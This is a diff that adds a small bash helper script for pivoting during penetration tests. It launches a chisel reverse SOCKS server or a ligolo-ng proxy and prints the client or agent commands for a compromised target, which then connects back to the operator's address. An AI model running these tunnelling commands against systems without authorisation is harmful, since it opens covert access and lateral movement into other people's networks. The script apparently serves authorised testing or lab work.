@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+# tunnel chisel [port]   start chisel reverse server + print the client (target) cmd
+# tunnel ligolo          start ligolo-proxy + print the agent (target) cmd
+lhost="$(~/.local/bin/hackbar vpn plain 2>/dev/null)"; [ -z "$lhost" ] && lhost="$(hostname -I|awk '{print $1}')"
+G=$'\e[38;2;158;206;106m'; B=$'\e[38;2;122;162;247m'; D=$'\e[38;2;86;95;137m'; X=$'\e[0m'
+case "${1:-}" in
+  chisel)
+    p="${2:-9001}"
+    echo "${B}run on TARGET${X} (get chisel via: serve):"
+    echo "${G}  ./chisel client $lhost:$p R:socks${X}"
+    echo "${D}then use: proxychains <tool>  (socks5 127.0.0.1:1080)${X}"
+    echo "${B}starting chisel server…${X}"
+    exec chisel server -p "$p" --reverse ;;
+  ligolo)
+    echo "${B}run on TARGET${X} (agent staged in ~/cyber/tools/ligolo):"
+    echo "${G}  ./ligolo-agent -connect $lhost:11601 -ignore-cert${X}"
+    echo "${D}in ligolo: session > then start_tunnel; add routes with: ip route add <subnet> dev ligolo${X}"
+    echo "${B}starting ligolo-proxy…${X}"
+    exec ligolo-proxy -selfcert ;;
+  *) echo "usage: tunnel chisel [port]  |  tunnel ligolo"; exit 1 ;;
+esac
